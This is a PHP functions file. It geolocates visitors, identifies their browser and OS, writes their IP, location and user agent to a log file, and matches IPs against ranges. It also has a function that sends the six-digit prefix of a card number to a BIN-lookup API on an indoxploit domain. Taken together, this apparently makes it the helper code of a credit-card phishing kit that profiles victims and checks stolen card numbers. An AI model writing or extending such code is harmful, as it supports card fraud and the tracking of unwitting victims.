<?php
function geolocation() {
    global $key;
    
    $ip = ($_SERVER['REMOTE_ADDR'] === '127.0.0.1' || $_SERVER['REMOTE_ADDR'] === '::1' || preg_match('/192.168./', $_SERVER['REMOTE_ADDR'])) ? '' : $_SERVER['REMOTE_ADDR'];
    $ip = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : $ip;
    return json_decode(file_get_contents("https://pro.ip-api.com/json/$ip?key={$key['ip']}"), true);
}

function getBrowser() {
    if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'safari/') && strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'opr/')) {
        $browser = 'Opera';
    } elseif(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'safari/') && strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'chrome/')) {
        $browser = 'Chrome';
    } elseif(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'msie') || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'trident/')) {
        $browser = 'Internet Explorer';
    } elseif(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'firefox/')) {
        $browser = 'Firefox';
    } elseif(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'safari/') && (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'opr/') === false) && (strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'chrome/') === false)) {
        $browser = 'Safari';
    } else {
        $browser = 'N/A';
    }

    return $browser;
}

function getOS() {
    $oses = array (
        'iPhone'         => '(iPhone)',
        'Windows 3.11'   => 'Win16',
        'Windows 95'     => '(Windows 95)|(Win95)|(Windows_95)',
        'Windows 98'     => '(Windows 98)|(Win98)',
        'Windows 2000'   => '(Windows NT 5.0)|(Windows 2000)',
        'Windows XP'     => '(Windows NT 5.1)|(Windows XP)',
        'Windows 2003'   => '(Windows NT 5.2)',
        'Windows Vista'  => '(Windows NT 6.0)|(Windows Vista)',
        'Windows 7'      => '(Windows NT 6.1)|(Windows 7)',   
        'Windows 8'      => '(Windows NT 6.2)',
        'Windows 10'     => '(Windows NT 10.0)',
        'Windows NT 4.0' => '(Windows NT 4.0)|(WinNT4.0)|(WinNT)|(Windows NT)',
        'Windows ME'     => 'Windows ME',
        'Open BSD'       => 'OpenBSD',
        'Sun OS'         => 'SunOS',
        'Linux'          => '(Linux)|(X11)',
        'Safari'         => '(Safari)',
        'Mac OS'         => '(Mac_PowerPC)|(Macintosh)',
        'QNX'            => 'QNX',
        'BeOS'           => 'BeOS',
        'OS/2'           => 'OS/2',
    );
    
    foreach($oses as $os => $preg_pattern) {
        if(@preg_match("/$preg_pattern/", $_SERVER['HTTP_USER_AGENT'])) {
            return $os;
        }
    }

    return 'N/A';
}

function visitor() {
    return array(
        'city'        => @geolocation()['city'],
        'country'     => @geolocation()['country'],
        'countryCode' => @geolocation()['countryCode'],
        'ip'          => $_SERVER['REMOTE_ADDR'],
        'userAgent'   => $_SERVER['HTTP_USER_AGENT'],
        'browser'     => getBrowser(),
        'os'          => getOS(),
        'accessPath'  => $_SERVER['REQUEST_URI'],
        'time'        => date('d/M/Y H:i:s')
    );
}

function bin($ccn) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.indoxploit.or.id/bin/'.substr($ccn, 0, 6));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

    $headers = array();
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    curl_close ($ch);

    return json_decode($result, true);
}

function logger($info, $optional = false) {
    if($optional) {
        $fopen = fopen("logs/{$info['file']}", 'a+');
        fwrite($fopen, "{$info['data']}\n");
        fclose($fopen);
    } else {
        $visitor = visitor();

        $fopen = fopen('logs/access.log', 'a+');
        fwrite($fopen, "[{$visitor['time']}] [$info] [PATH: {$visitor['accessPath']}] [{$visitor['ip']} - {$visitor['city']}, {$visitor['country']} - {$visitor['userAgent']}]\n");
        fclose($fopen);
    }
}

function ipv4_in_range($ip, $range) {
    if (strpos($range, '/') !== false) {
        // $range is in IP/NETMASK format
        list($range, $netmask) = explode('/', $range, 2);
        if (strpos($netmask, '.') !== false) {
            // $netmask is a 255.255.0.0 format
            $netmask = str_replace('*', '0', $netmask);
            $netmask_dec = ip2long($netmask);
            return ( (ip2long($ip) & $netmask_dec) == (ip2long($range) & $netmask_dec) );
        } else {
            // $netmask is a CIDR size block
            // fix the range argument
            $x = explode('.', $range);
            while(count($x)<4) $x[] = '0';
            list($a,$b,$c,$d) = $x;
            $range = sprintf("%u.%u.%u.%u", empty($a)?'0':$a, empty($b)?'0':$b,empty($c)?'0':$c,empty($d)?'0':$d);
            $range_dec = ip2long($range);
            $ip_dec = ip2long($ip);
            
            # Strategy 1 - Create the netmask with 'netmask' 1s and then fill it to 32 with 0s
            #$netmask_dec = bindec(str_pad('', $netmask, '1') . str_pad('', 32-$netmask, '0'));
            
            # Strategy 2 - Use math to create it
            $wildcard_dec = pow(2, (32-$netmask)) - 1;
            $netmask_dec = ~ $wildcard_dec;
            
            return (($ip_dec & $netmask_dec) == ($range_dec & $netmask_dec));
        }
    } else {
        // range might be 255.255.*.* or 1.2.3.0-1.2.3.255
        if (strpos($range, '*') !==false) { // a.b.*.* format
            // Just convert to A-B format by setting * to 0 for A and 255 for B
            $lower = str_replace('*', '0', $range);
            $upper = str_replace('*', '255', $range);
            $range = "$lower-$upper";
        }
        
        if (strpos($range, '-')!==false) { // A-B format
            list($lower, $upper) = explode('-', $range, 2);
            $lower_dec = (float)sprintf("%u",ip2long($lower));
            $upper_dec = (float)sprintf("%u",ip2long($upper));
            $ip_dec = (float)sprintf("%u",ip2long($ip));
            return ( ($ip_dec>=$lower_dec) && ($ip_dec<=$upper_dec) );
        }
        return false;
    } 
}